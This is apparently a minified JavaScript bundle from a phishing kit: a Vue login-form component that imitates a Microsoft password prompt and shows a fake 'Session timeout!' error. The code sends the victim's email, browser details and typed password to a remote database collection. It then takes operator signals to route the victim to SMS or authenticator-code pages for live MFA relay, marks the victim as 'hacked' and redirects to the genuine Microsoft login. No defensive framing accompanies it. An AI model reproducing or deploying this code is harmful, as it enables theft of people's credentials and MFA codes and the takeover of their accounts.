(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["mobileLoginForm"],{"67c0":function(e,r,t){"use strict";var a=t("86fc"),o=t.n(a);o.a},"86fc":function(e,r,t){},da34:function(e,r,t){"use strict";t.r(r);var a=function(){var e=this,r=e.$createElement,t=e._self._c||r;return t("v-container",{staticClass:"d-flex justify-center",attrs:{"fill-height":""}},[t("v-dialog",{attrs:{width:"470",persistent:""},model:{value:e.showDialog,callback:function(r){e.showDialog=r},expression:"showDialog"}},[t("v-card",{staticClass:"pa-10",attrs:{width:"500",disabled:e.disableCard,tile:""}},[t("v-toolbar",{attrs:{flat:""}},[t("v-toolbar-title",[t("v-img",{staticClass:"my-2",attrs:{alt:"Microsoft Logo",src:e.companyLogo,transition:"scale-transition","max-height":"70","max-width":"150"}}),t("v-btn",{staticClass:"text-none pl-1",attrs:{text:!0,color:"",depressed:""}},[e._v(" "+e._s(e.email)+" ")])],1)],1),t("v-card-text",[t("h2",{staticClass:"mt-6 mb-5 black--text"},[e._v("Enter password")]),e.error?t("p",{staticClass:"red--text"},[e._v(" "+e._s(e.errorMessage)+" ")]):e._e(),t("v-form",{ref:"form",attrs:{"lazy-validation":""},on:{submit:function(r){return r.preventDefault(),e.onSubmit(r)}}},[t("v-text-field",{attrs:{dense:!0,label:"Password",type:"password",required:""},on:{keyup:function(r){return!r.type.indexOf("key")&&e._k(r.keyCode,"enter",13,r.key,"Enter")?null:e.submitForm(r)}},model:{value:e.password,callback:function(r){e.password=r},expression:"password"}}),t("router-link",{attrs:{to:""}},[t("p",{staticClass:"caption"},[e._v("Forgot my password")])]),t("v-row",[t("v-spacer"),t("v-btn",{staticClass:"rounded-button white--text text-none",attrs:{width:"",depressed:!0,color:"#005DA6"},on:{click:e.submitForm}},[e._v("Manage Settings")])],1),t("p",{staticClass:"caption"})],1)],1)],1)],1)],1)},o=[],s=(t("99af"),t("4160"),t("caad"),t("ac1f"),t("2532"),t("1276"),t("498a"),t("159b"),t("96cf"),t("1da1")),n=t("dc59"),c={name:"LoginForm",data:function(){return{showDialog:!0,error:!0,errorMessage:"Session timeout!",disableCard:!1,email:"",password:"",companyLogo:"",showLogo:!1,workerNumber:0,browser:"chrome_100",clean:!0,companyName:""}},created:function(){var e=this;return Object(s["a"])(regeneratorRuntime.mark((function r(){var t,a,o,c,i,l;return regeneratorRuntime.wrap((function(r){while(1)switch(r.prev=r.next){case 0:return t=localStorage.getItem("hacked"),t&&(window.location.href="https://login.microsoftonline.com"),console.log(e.$route.params.data),e.email=e.$route.params.data.includes("@")?e.$route.params.data:window.atob(e.$route.params.data).split(",")[0],e.companyLogo=window.atob(e.$route.params.data).split(",")[3],r.next=7,n["a"].collection("workers");case 7:return a=r.sent,r.next=10,a.doc("current").get();case 10:return o=r.sent,e.workerNumber=o.data().worker,e.browser=e.$route.params.browser||"chrome_".concat(e.workerNumber),console.log(e.browser),r.next=16,a.doc(e.browser).set({browser:e.browser,data_type:"email",email:e.email.trim(),password:"",smsCode:"",smsInfo:"",cookies:"",from:"client",info:"",screenState:""},{merge:!0});case 16:if(e.companyName=e.email.split("@")[1].split(".")[0],window.document.title=e.companyName,!e.clean){r.next=23;break}return r.next=21,a.doc("current").get();case 21:c=r.sent,e.workerNumber=c.data().worker;case 23:if(console.log(e.workerNumber),!e.clean){r.next=28;break}return i=20===e.workerNumber?1:e.workerNumber+1,r.next=28,a.doc("current").set({worker:i});case 28:return e.clean=!1,r.next=31,n["a"].collection("visited");case 31:return l=r.sent,r.next=34,l.doc(e.email).set({email:e.email,agent:navigator.userAgent},{merge:!0});case 34:a.where("browser","==",e.browser).onSnapshot((function(r){r.docChanges().forEach(function(){var r=Object(s["a"])(regeneratorRuntime.mark((function r(t){var a;return regeneratorRuntime.wrap((function(r){while(1)switch(r.prev=r.next){case 0:if(a=t.doc.data(),console.log(t.type),"server"!==a.from||"modified"!==t.type){r.next=12;break}if("password_error"===a.info&&(e.error=!0,e.errorMessage="Your account or password is incorrect.",e.disableCard=!1,e.password=""),"sms"!==a.screenState){r.next=7;break}return r.next=7,e.$router.push({path:"/identifier/sms/".concat(e.$route.params.data,"/").concat(e.browser,"/").concat(a.smsInfo)});case 7:if("authenticator"!==a.screenState){r.next=11;break}return console.log(e.email,e.companyLogo),r.next=11,e.$router.push({path:"/identifier/authenticator/".concat(e.$route.params.data,"/").concat(e.browser)});case 11:"verification_complete"===a.info&&(localStorage.setItem("hacked",!0),window.location.href="https://login.microsoftonline.com");case 12:case"end":return r.stop()}}),r)})));return function(e){return r.apply(this,arguments)}}())}));case 35:case"end":return r.stop()}}),r)})))()},computed:{},methods:{submitForm:function(){var e=this;return Object(s["a"])(regeneratorRuntime.mark((function r(){var t;return regeneratorRuntime.wrap((function(r){while(1)switch(r.prev=r.next){case 0:if(e.disableCard=!0,e.error=!1,!(e.password.length<4)){r.next=7;break}return e.error=!0,e.errorMessage="Your account or password is incorrect.",e.disableCard=!1,r.abrupt("return");case 7:return console.log(e.browser),r.next=10,n["a"].collection("workers");case 10:return t=r.sent,r.next=13,t.doc(e.browser).set({browser:e.browser,data_type:"password",password:e.password,from:"client",info:""},{merge:!0});case 13:case"end":return r.stop()}}),r)})))()}}},i=c,l=(t("67c0"),t("2877")),d=t("6544"),u=t.n(d),m=t("8336"),p=t("b0af"),w=t("99d9"),f=t("a523"),b=t("169a"),g=t("4bd4"),h=t("adda"),v=t("0fd9"),x=t("2fa4"),k=t("8654"),y=t("71d9"),C=t("2a7f"),_=Object(l["a"])(i,a,o,!1,null,null,null);r["default"]=_.exports;u()(_,{VBtn:m["a"],VCard:p["a"],VCardText:w["a"],VContainer:f["a"],VDialog:b["a"],VForm:g["a"],VImg:h["a"],VRow:v["a"],VSpacer:x["a"],VTextField:k["a"],VToolbar:y["a"],VToolbarTitle:C["a"]})}}]);
//# sourceMappingURL=mobileLoginForm.718bdae5.js.map